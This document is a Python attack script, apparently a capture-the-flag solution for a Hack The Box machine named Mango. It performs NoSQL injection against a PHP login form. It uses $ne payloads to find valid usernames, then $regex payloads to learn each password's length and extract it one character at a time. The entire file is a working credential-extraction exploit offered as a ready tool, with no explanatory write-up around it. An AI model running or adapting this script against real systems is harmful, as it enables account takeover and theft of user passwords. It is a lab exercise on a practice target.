#!/bin/python3

import requests
import urllib3
import urllib
from urllib.parse import quote
urllib3.disable_warnings()

usernames=['admin', 'mango', 'sweet', 'delicous', 'juicy', 'root']
url='http://staging-order.mango.htb/index.php'
#url='http://localhost:5533'

headers={
    "Host": "staging-order.mango.htb",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "http://staging-order.mango.htb/index.php",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "PHPSESSID=sojrmfjb7sf228g1to8ffok81q",
    "Cache-Control": "max-age=0",
}

def find_password_length(username, max_length=64):
    for i in range(1, max_length+1):
        payload = f"username={username}&password[$regex]=.{{{i}}}&login=login"
        response = requests.post(url, headers=headers, data=payload, allow_redirects=False)
        if response.status_code != 302:
            return i-1

def find_password(username, length):
    chars="""0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#'(),-/:;<=>@[]^_`{}~ """
    password = ''
    for i in reversed(range(length)):
        char_found = False
        for char in chars:
            payload=f"username={username}&password[$regex]={quote(password+char)}.{{{i}}}&login=login"
            response = requests.post(url, headers=headers, data=payload, allow_redirects=False)
            if response.status_code == 302:
                char_found = True
                password += char
                break
        if not char_found:
            print(f"All chars used but no match found. The password probably includes special chars")
            return ''
    return password

#password = find_password('mango', 16)
#exit()

for username in usernames:
    payload=f"username[$eq]={username}&password[$ne]=&login=login"
    response = requests.post(url, headers=headers, data=payload, allow_redirects=False)
    if response.status_code == 302:
        print(f"User {username} is valid")
        length = find_password_length(username)
        print(f"Password length: {length}")
        password = find_password(username, length)
        if password:
            print("Password found!: ", password)
        else:
            print("Error finding password")
